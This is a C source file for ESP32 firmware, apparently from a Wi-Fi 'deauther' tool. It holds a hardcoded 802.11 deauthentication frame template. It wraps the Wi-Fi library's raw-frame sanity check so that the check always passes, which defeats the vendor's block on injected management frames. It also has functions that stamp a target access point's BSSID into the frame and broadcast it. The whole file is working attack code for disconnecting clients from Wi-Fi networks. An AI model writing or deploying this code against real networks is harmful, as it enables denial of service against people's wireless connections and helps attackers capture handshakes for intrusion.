/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Linker wrap override for ieee80211_raw_frame_sanity_check.
 *
 * Paired with -Wl,--wrap=ieee80211_raw_frame_sanity_check in CMakeLists.txt the
 * linker redirects every call made inside the Wi-Fi library to this function.
 * Returning 0 unconditionally lets raw deauthentication frames pass the frame
 * validity check. Unlike the previous -zmuldefs same-name override this does
 * not depend on link order.
 *
 * @attention Not meant to be called directly; used by the linker only.
 * @see Original idea https://github.com/GANESH-ICMC/esp32-deauther
 */
int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Raw 802.11 transmit failed: %s", esp_err_to_name(ret));
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}
